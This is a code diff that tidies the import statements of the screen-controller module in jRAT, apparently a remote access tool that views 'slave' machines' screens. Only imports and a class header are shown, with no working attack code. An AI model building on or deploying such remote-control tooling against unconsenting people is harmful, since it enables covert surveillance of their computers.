@@ -1,13 +1,18 @@
 package jrat.module.screen;
 
-import jrat.api.*;
-import jrat.api.ui.*;
+import jrat.api.ClientEventListener;
+import jrat.api.Module;
+import jrat.api.Resources;
+import jrat.api.ui.ClientMenu;
+import jrat.api.ui.ClientMenuItem;
+import jrat.api.ui.ControlPanel;
+import jrat.api.ui.ControlPanelTab;
 import jrat.controller.AbstractSlave;
 import jrat.controller.Slave;
 import jrat.controller.packets.incoming.IncomingPackets;
+import jrat.module.screen.packets.PacketReceiveAllThumbnails;
 import jrat.module.screen.packets.PacketRemoteScreenChunk;
 import jrat.module.screen.packets.PacketRemoteScreenCompleted;
-import jrat.module.screen.packets.PacketReceiveAllThumbnails;
 import jrat.module.screen.ui.PanelScreenController;
 
 public class ScreenControllerModule extends Module {
